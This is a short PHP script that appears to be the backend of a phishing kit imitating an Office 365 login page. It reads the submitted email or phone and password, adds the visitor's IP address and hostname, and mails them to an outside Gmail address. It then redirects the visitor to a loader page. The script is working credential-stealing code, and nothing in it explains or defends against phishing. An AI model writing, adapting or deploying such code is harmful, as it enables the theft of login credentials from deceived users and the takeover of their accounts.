<?
$to = "camachodaniel1306@gmail.com";
//--------------------------------
$offizeuname = $_POST['offizeuname'];
$offizepasuma = $_POST['offizepasuma'];
$ip = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$subj = "| |Offize365Mail  |";
$msg = "Email or Phone : $offizeuname\nPassword : $offizepasuma\nHost : $host\nIP : $ip";
$from = "FROM: Snoop Inc<m@m>";
			
			{
		mail($to,$subj."|".$ip,$msg);
				}
			header("location: 1loader.php");
?>